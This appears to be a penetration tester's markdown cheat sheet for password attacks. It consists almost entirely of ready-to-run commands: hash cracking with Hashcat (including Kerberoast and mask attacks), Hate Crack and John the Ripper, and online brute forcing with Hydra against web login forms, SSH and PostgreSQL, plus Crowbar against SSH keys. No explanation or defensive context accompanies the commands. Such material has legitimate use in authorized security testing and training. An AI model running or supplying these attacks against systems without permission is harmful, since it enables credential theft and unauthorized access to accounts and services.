# Cracking Passwords & More
======

## Hash Cracking
------
#### Hashcat w/Wordlist
.\hashcat64.exe -m 1000 C:\Users\Cary\Desktop\hash -o C:\path\to\hash E:\path\to\wordlist.txt

#### Hashcat to Crack Kerberoast Hash
./hashcat64.bin -m 13100 hash wordlist.txt --rules OneRuleToRuleThemAll
#### Hate Crack (TrustedSec)
python ../hate_crack/hate_crack.py C:\path\to\hash 1000
#### John The Ripper (JrR)
john passwd.hash
#### John Wordlist
john passwd.hash --wordlist=rockyou.txt

#### John MD5 Raw
john hash.txt -format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt

## Hashcat
------
#### Hashcat (wordlist)
hashcat64.exe -m 100 C:\path\to\hashes -o C:\path\to\outfile E:\path\to\wordlist
#### Hashcat (mask attack / 6 character)
hashcat64.exe -m 0 C:\path\to\hash -o C:\path\to\outfile -a 3 -1 ?a ?1?1?1?1?1?1
#### Hashcat (rules)
hashcat  -m 1000 hash words.txt -w3 -O -r rule.rule

## Brute Forcing
------
#### THC Hydra

#### HTTPS form post
hydra IP https-form-post "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password." -l test -P /usr/share/wordlists/rockyou.txt -t 16 -w 30 -o hydra.out.txt -vV
#### HTTP with user specified
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 32 192.168.0.150 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!" -vV
#### Brute Force SSH
hydra -L users.txt -P unix_passwords.txt -o hydra.out.txt ssh://192.168.56.209 -vV
#### Postgresql
hydra -l postgres -P /usr/share/metasploit-framework/data/wordlists/password.lst postgres://192.168.3.100
#### Crowbar (Brute SSH Keys)
crowbar -b sshkey -s IP/32 -U userlist -k keys/debian-ssh/uncommon_keys/rsa1/4096/